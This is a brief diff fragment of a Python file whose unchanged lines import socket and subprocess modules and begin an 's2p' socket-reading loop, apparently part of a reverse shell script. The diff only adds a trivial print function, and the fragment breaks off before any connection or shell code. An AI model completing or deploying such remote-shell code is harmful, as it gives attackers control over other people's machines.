@@ -1,4 +1,9 @@
 import os,socket,subprocess,threading;
+
+
+def t():
+    print("t")
+
 def s2p(s, p):
     while True:
         data = s.recv(1024)
